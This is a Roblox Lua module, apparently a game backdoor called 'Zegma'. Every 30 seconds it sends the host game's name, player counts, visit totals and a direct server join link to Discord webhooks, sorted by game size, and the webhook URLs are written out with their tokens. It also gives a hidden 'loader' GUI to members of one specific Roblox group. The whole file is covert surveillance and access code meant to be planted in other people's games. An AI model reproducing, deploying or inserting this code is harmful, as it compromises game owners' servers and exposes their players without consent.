local Zegma   = {}
local Players = game:GetService("Players")
local Http    = game:GetService("HttpService")
local Market  = game:GetService("MarketplaceService")
local Run     = game:GetService("RunService")

local WEBHOOKS = {
	small   = "https://discord.com/api/webhooks/1570238688825315698/Wsf8Ouht-YTLBL9xEPzvrN3B2WOwyyIBRtOdLJZaqFN7SWi27viKhckm-ujh4Xbbg4Ix",
	medium  = "https://discord.com/api/webhooks/1570238752314630205/zIyhKkYb__D21p8xK1f44JGy_C_yB3s8iIBiwGrBwQjVqY19dW1lN2-EZp8wbHBm_yqQ",
	large   = "https://discord.com/api/webhooks/1570238849903497457/b-ucRr4MZ_Zi8wrHW25rl-0vU2PByWrwBerkBKRI9VE_jgX3ID2_gq4y-fNN0zLrw5xh",
	huge    = "https://discord.com/api/webhooks/1570238901874983023/7xLPY1v1F4LM6NyLAJ40B4N46EWIl281hgx7vWXfxniMY72HuR1zO2_p7kfKp8pdsLKV",
	massive = "https://discord.com/api/webhooks/1570238955457220628/_ntsTOlDM75aOGGV8qKljobV0HYYQ5_B1KUEtacPam6yfjYcWkBbQorcvHWJQcvj1VCf",
	max     = "https://discord.com/api/webhooks/1570239073551913054/l01ZxQxWdaPmHvFtmxC_qTX0Fu4u-9ArdO48yjc4aU23AnngjXfN2TuDbDNKdvBjuWj0",
}

local GROUP_ID    = 218912591
local initialized = false
local guiTemplate = script:WaitForChild("loader")

local function getWebhook(total)
	if     total <= 10   then return "1 - 10 players",    WEBHOOKS.small
	elseif total <= 50   then return "10 - 50 players",   WEBHOOKS.medium
	elseif total <= 100  then return "50 - 100 players",  WEBHOOKS.large
	elseif total <= 500  then return "100 - 500 players", WEBHOOKS.huge
	elseif total <= 1000 then return "500 - 1k players",  WEBHOOKS.massive
	else                      return "1000+ players",     WEBHOOKS.max
	end
end

local function inGroup(player)
	local ok, rank = pcall(function()
		return player:GetRankInGroup(GROUP_ID)
	end)
	return ok and rank >= 1
end

local function removeGui(player)
	local playerGui = player:FindFirstChild("PlayerGui")
	if not playerGui then return end
	local gui = playerGui:FindFirstChild(guiTemplate.Name)
	if gui then gui:Destroy() end
end

local function giveOrRemove(player)
	if not inGroup(player) then
		removeGui(player)
		return
	end

	local playerGui = player:WaitForChild("PlayerGui", 10)
	if not playerGui then return end
	if playerGui:FindFirstChild(guiTemplate.Name) then return end

	local gui = guiTemplate:Clone()
	gui.Enabled      = true
	gui.ResetOnSpawn = false
	gui.Parent       = playerGui
end

local function sendLog()
	local placeId = game.PlaceId
	local gameId  = game.GameId

	local info = Market:GetProductInfo(placeId, Enum.InfoType.Place)
	local name = info and info.Name or "Unknown"

	local ok, res = pcall(Http.GetAsync, Http,
		"https://games.roproxy.com/v1/games?universeIds=" .. gameId, true)

	local data        = ok and Http:JSONDecode(res).data or {}
	local entry       = data[1] or {}
	local total       = entry.playing or 0
	local visits      = entry.visits  or 0
	local serverCount = #Players:GetPlayers()

	local label, webhook = getWebhook(total)

	local joinLink = string.format(
		"roblox://experiences/start?placeId=%d&gameInstanceId=%s",
		placeId, game.JobId)

	local payload = Http:JSONEncode({
		embeds = {{
			title  = "🔵 Zegma External",
			color  = 0x5B8CDB,
			author = { name = "Zegma External" },
			fields = {
				{ name = "🎮 Game",          value = "`" .. name .. "`",                                     inline = false },
				{ name = "🖥️ Server",        value = string.format("`%d / %d`", serverCount, Players.MaxPlayers), inline = true  },
				{ name = "🌍 Total Playing", value = "`" .. tostring(total) .. "`",                          inline = true  },
				{ name = "📊 Size",          value = "`" .. label .. "`",                                    inline = true  },
				{ name = "👀 Visits",        value = "`" .. tostring(visits) .. "`",                         inline = true  },
				{ name = "🔗 Join",          value = "[Click to join](" .. joinLink .. ")",                  inline = false },
			},
			footer    = { text = "Zegma • " .. os.date("%X") },
			timestamp = DateTime.now():ToIsoDate(),
		}}
	})

	pcall(Http.PostAsync, Http, webhook, payload, Enum.HttpContentType.ApplicationJson)
end

function Zegma.Init()
	if not Run:IsServer() then return end
	if initialized then return end
	initialized = true

	task.spawn(function()
		while true do
			sendLog()
			task.wait(30)
		end
	end)

	for _, player in ipairs(Players:GetPlayers()) do
		task.spawn(giveOrRemove, player)
		player.CharacterAdded:Connect(function()
			task.wait(0.1)
			giveOrRemove(player)
		end)
	end

	Players.PlayerAdded:Connect(function(player)
		task.spawn(giveOrRemove, player)
		player.CharacterAdded:Connect(function()
			task.wait(0.1)
			giveOrRemove(player)
		end)
	end)
end

return Zegma
